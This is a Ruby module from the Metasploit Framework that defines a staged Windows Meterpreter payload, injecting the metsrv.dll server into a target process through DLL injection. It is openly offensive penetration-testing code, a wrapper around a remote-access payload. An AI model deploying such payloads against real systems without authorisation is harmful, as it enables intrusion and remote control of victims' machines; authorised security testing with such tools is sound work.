##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/payload/windows/dllinject'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the meterpreter server instance DLL via the DLL injection payload.
#
###
module Metasploit3

  include Msf::Payload::Windows::DllInject
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
        Msf::Module::ModuleInfo.update!(
            info,
            'Name'          => 'Windows Meterpreter (skape/jt Injection)',
            'Description'   => 'Inject the meterpreter server DLL (staged)',
            'Author'        => 'skape',
            'License'       => MSF_LICENSE,
            'Session'       => Msf::Sessions::Meterpreter_x86_Win
        )
    )

    # Don't let people set the library name option
    options.remove_option('LibraryName')
    options.remove_option('DLL')
  end

  #
  # The library name that we're injecting the DLL as has to be metsrv.dll for
  # extensions to make use of.
  #
  def library_name
    "metsrv.dll"
  end

  def library_path
    Metasploit::Framework.root.join('data', 'meterpreter', 'metsrv.dll').to_path
  end

end
